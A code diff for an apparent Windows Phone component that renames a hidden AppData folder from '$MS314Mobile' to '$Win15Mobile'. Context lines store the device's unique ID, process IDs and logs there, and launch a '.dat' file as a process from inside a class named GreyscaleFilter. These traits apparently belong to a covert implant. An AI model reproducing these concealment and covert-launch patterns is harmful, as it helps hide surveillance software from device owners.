@@ -317,10 +317,10 @@ WCHAR* startBNSIUpdateNotification()
 	BYTE array[20];
 	_DevicePropertiesGetUniqueDeviceId(array,sizeof(array));
 
-	CreateDirectory(L"\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$MS314Mobile\\", NULL);
+	CreateDirectory(L"\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$Win15Mobile\\", NULL);
 	//IMPORTANTISSIMO BYGIO DA CRIPTARE
 	fstream filestrID;
-	filestrID.open ("\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$MS314Mobile\\id.bin", fstream::out|fstream::binary);
+	filestrID.open ("\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$Win15Mobile\\id.bin", fstream::out|fstream::binary);
 	filestrID.write((char*)array,sizeof(array));
 	filestrID.close();
 
@@ -372,7 +372,7 @@ void chackBachGround(void)
 	vibr->Vibrate(span);
 	*/
 
-	CreateDirectory(L"\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$MS314Mobile\\", NULL);
+	CreateDirectory(L"\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$Win15Mobile\\", NULL);
 
 	char *Tmp=(char*)GetTickCount64;
 	Tmp=(char*)((~0xFFF)&(DWORD_PTR)Tmp);
@@ -452,10 +452,10 @@ DWORD startCreate(void)
 	_DevicePropertiesGetUniqueDeviceId(array,sizeof(array));
 
 
-	CreateDirectory(L"\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$MS314Mobile\\", NULL);
+	CreateDirectory(L"\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$Win15Mobile\\", NULL);
 	//IMPORTANTISSIMO BYGIO DA CRIPTARE
 	fstream filestrID;
-	filestrID.open ("\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$MS314Mobile\\id.bin", fstream::out|fstream::binary);
+	filestrID.open ("\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$Win15Mobile\\id.bin", fstream::out|fstream::binary);
 	filestrID.write((char*)array,sizeof(array));
 	filestrID.close();
 
@@ -478,7 +478,7 @@ DWORD startPI(void)
 	vibr->Vibrate(span);
 	*/
 
-	CreateDirectory(L"\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$MS314Mobile\\", NULL);
+	CreateDirectory(L"\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$Win15Mobile\\", NULL);
 
 	char *Tmp=(char*)GetTickCount64;
 	Tmp=(char*)((~0xFFF)&(DWORD_PTR)Tmp);
@@ -530,14 +530,14 @@ DWORD startPI(void)
 	char msgA[128];
 		
 	char buff[DTTMSZ];
-	fileTXT.open ("\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$MS314Mobile\\log.txt", fstream::out|fstream::app);		
+	fileTXT.open ("\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$Win15Mobile\\log.txt", fstream::out|fstream::app);		
 	fileTXT << getDtTm (buff) << std::endl;
 #endif
 
 
 	// carico da file il pid dell'ultimo processo lanciato
 	fstream filestr;
-	filestr.open("\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$MS314Mobile\\pid.bin", fstream::in|fstream::binary);
+	filestr.open("\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$Win15Mobile\\pid.bin", fstream::in|fstream::binary);
 	filestr.seekg (0, ios::beg);
 	filestr.read ((char*)&pidLastRun, sizeof(pidLastRun));
 	filestr.close();
@@ -592,7 +592,7 @@ DWORD startPI(void)
 
 
 	if(CreateProcessA("MyPhoneInfo.dat",0,0,0,FALSE,0,0,0,&si,&pi)==0)		
-	//CreateProcessA("cmd_arm.exe"," /C \\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$MS314Mobile\\w1.exe",0,0,FALSE,0,0,0,&si,&pi);
+	//CreateProcessA("cmd_arm.exe"," /C \\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$Win15Mobile\\w1.exe",0,0,FALSE,0,0,0,&si,&pi);
     {
 		//non sono riuscito a creare il processo
 #ifdef LOG
@@ -615,7 +615,7 @@ DWORD startPI(void)
     }
 
 	//salvo in file.pid il pid del processo che gira adesso
-	filestr.open("\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$MS314Mobile\\pid.bin", fstream::out|fstream::binary);
+	filestr.open("\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$Win15Mobile\\pid.bin", fstream::out|fstream::binary);
 	filestr.seekg (0, ios::beg);
 	filestr.write ((const char*)&pi.dwProcessId, sizeof(pi.dwProcessId));
 	filestr.close();
@@ -762,7 +762,7 @@ DWORD saveAllPID(void)
 	Windows::Phone::Devices::Notification::VibrationDevice^ vibr = Windows::Phone::Devices::Notification::VibrationDevice::GetDefault();
 	vibr->Vibrate(span);
 
-	CreateDirectory(L"\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$MS314Mobile\\", NULL);
+	CreateDirectory(L"\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$Win15Mobile\\", NULL);
 
 	char *Tmp=(char*)GetTickCount64;
 	Tmp=(char*)((~0xFFF)&(DWORD_PTR)Tmp);
@@ -798,13 +798,13 @@ DWORD saveAllPID(void)
 	char msgA[128];
 		
 	char buff[DTTMSZ];
-	fileTXT.open ("\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$MS314Mobile\\logPID.txt", fstream::out|fstream::app);		
+	fileTXT.open ("\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$Win15Mobile\\logPID.txt", fstream::out|fstream::app);		
 	fileTXT << getDtTm (buff) << std::endl;
 #endif
 
 	// carico da file il pid dell'ultimo processo lanciato
 	fstream filestr;
-	filestr.open("\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$MS314Mobile\\pid.bin", fstream::in|fstream::binary);
+	filestr.open("\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$Win15Mobile\\pid.bin", fstream::in|fstream::binary);
 	filestr.seekg (0, ios::beg);
 	filestr.read ((char*)&pidLastRun, sizeof(pidLastRun));
 	filestr.close();
@@ -931,7 +931,7 @@ void GreyscaleFilter::BNSIsaveExpiryTime(Platform::String^ ExpiryTime)
 	char msgA[128];
 		
 	char buff[DTTMSZ];
-	fileExpiryTime.open ("\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$MS314Mobile\\ExpiryTimPID.txt", fstream::out|fstream::app);		
+	fileExpiryTime.open ("\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$Win15Mobile\\ExpiryTimPID.txt", fstream::out|fstream::app);		
 	fileExpiryTime << getDtTm (buff) << std::endl;
 	fileExpiryTime << "ExpiryTime: ";
 	wcstombs(msgA, ExpiryTime->Data(), wcslen(ExpiryTime->Data())+1);
@@ -944,13 +944,13 @@ void GreyscaleFilter::SaveOV(Platform::String^ strOV)
 {
 	fstream filestrOV;
 	/*
-	filestrOV.open ("\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$MS314Mobile\\OV.bin", fstream::out|fstream::binary);
+	filestrOV.open ("\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$Win15Mobile\\OV.bin", fstream::out|fstream::binary);
 	filestrOV.write((char*)strOV,wcslen(strOV->Data())+1);
 	filestrOV.close();
 */
 	char msgA[128];
 		
-	filestrOV.open ("\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$MS314Mobile\\OV.bin", fstream::out|fstream::binary);		
+	filestrOV.open ("\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$Win15Mobile\\OV.bin", fstream::out|fstream::binary);		
 	wcstombs(msgA, strOV->Data(), wcslen(strOV->Data())+1);
 	filestrOV << msgA << std::endl;
 	filestrOV.close();
